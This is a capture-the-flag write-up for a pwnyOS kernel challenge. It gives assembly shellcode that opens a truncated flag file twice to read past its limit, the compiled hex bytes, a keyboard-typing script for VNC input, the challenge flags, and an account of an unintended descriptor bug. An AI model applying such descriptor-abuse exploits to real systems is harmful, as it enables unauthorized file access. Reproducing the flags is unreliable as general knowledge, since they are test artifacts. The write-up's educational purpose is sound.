##  Freaky_File_Descriptors (400 points)
How does the OS know what bytes to give you when you call read? How does it keep track of how far you've read into a file?

Find an exploit that lets you read past the end of /sandb0x/freaky_fds.txt and see what was truncated!

Author: Ravi

---

This challenge was part of a series of kernel exploitation challenges using pwnyOS. There was no binary provided and we only had access through VNC. The [documentation](https://github.com/sigpwny/pwnyOS-2020-docs) for the OS helped a lot when solving these challenges. I suggest taking a look if you haven't already.

---

#### tl;dr: open, read, open, read, write

The goal of this challenge is to read the full contents of `/sandb0x/freaky_fds.txt`. After getting a shell and running `cat` on the file, we realize that we can only read a certain amount of bytes.

![](https://i.imgur.com/UxO6zhg.jpg)

Looking in the documentation, we see some interesting things about the syscalls.

![](https://i.imgur.com/Bsh6Qwy.png)

What if we try opening the file twice?

Since reading is a seeking operation, opening a second file descriptor without closing the first one might let us view the entire file!

```
bits 32

global _start

section .text
_start:
  ; open /sandb0x/freaky_fds.txt (syscall 2)
  mov ebp, 0x0804e0a0
  mov eax, 2
  lea ebx, [ebp + file]
  int 0x80

  ; read 0x100 bytes from the file descriptor (syscall 4)
  ; store the result at a temporary location (0x804e1a0)
  mov ebx, eax
  mov eax, 4
  mov edx, 0x100
  mov ecx, 0x804e1a0
  int 0x80

  ; open /sandb0x/freaky_fds.txt again (syscall 2)
  lea ebx, [ebp + file]
  mov eax, 2
  int 0x80

  ; read 0x100 bytes from the second file descriptor (syscall 4)
  ; store the result at a temporary location (0x804e1a0)
  mov ebx, eax
  mov eax, 4
  mov ecx, 0x804e1a0
  mov edx, 0x100
  int 0x80

  ; read the temporary location (0x804e1a0) (syscall 5)
  ; write the result to stdout (FD 0)
  mov eax, 5
  xor ebx, ebx
  mov ecx, 0x804e1a0
  int 0x80

file:
  db "/sandb0x/freaky_fds.txt"
data:
  db 0
```

Compile the assembly with `nasm` and use `xxd` to convert the shellcode to ASCII characters.

```bash
> nasm f.asm && xxd -p f

bda0e00408b8020000008d9d53000000cd8089c3b804000000ba00010000
b9a0e10408cd808d9d53000000b802000000cd8089c3b804000000b9a0e1
0408ba00010000cd80b80500000031dbb9a0e10408cd802f73616e646230
782f667265616b795f6664732e74787400
```

Success!

![](https://i.imgur.com/ETtOYMz.jpg)

`uiuctf{b0y_1_sur3_d0_l0v3_overfl0ws}`

Fun fact: you don't even need to exit the binexec loop to solve this! According to the documentation, we are allowed to usethe following syscalls in sandbox mode:

![](https://i.imgur.com/Ze41EvP.png)

which is all we need to run the exploit!

---

### How we solved it originally (small oops!)

We were about to go to sleep after a long night, but at 4 AM, the kernel challenges were released. After logging in and exiting the `binexec` loop, I stumbled upon the flag after trying random things. I found that running `binexec`, exiting immediately, and running `cat` on the file would display the flag.

It looked like this:

![](https://i.imgur.com/lhQg7KH.png)

We contacted the admins and recieved the `Oops` flag: `uiuctf{nice_w0rk_dicegang}`


After the CTF ended, I talked to Ravi, the challenge author, about why our exploit worked. He said that there weren't checks to see if the file descriptors were in use or if they belonged to the same file. In theory, this would occur with any file that was opened and read from, not just `binexec`.

---

This was the script I used to input through VNC:

```python
import keyboard
import time

time.sleep(3)

shellcode = """
bda0e00408b8020000008d9d53000000cd8089c3b804000000ba00010000
b9a0e10408cd808d9d53000000b802000000cd8089c3b804000000b9a0e1
0408ba00010000cd80b80500000031dbb9a0e10408cd802f73616e646230
782f667265616b795f6664732e74787400
"""

for line in shellcode.split("\n"):
    keyboard.write(line)
    keyboard.press_and_release("enter")

time.sleep(0.2)

keyboard.write("done")
keyboard.press_and_release("enter")
```

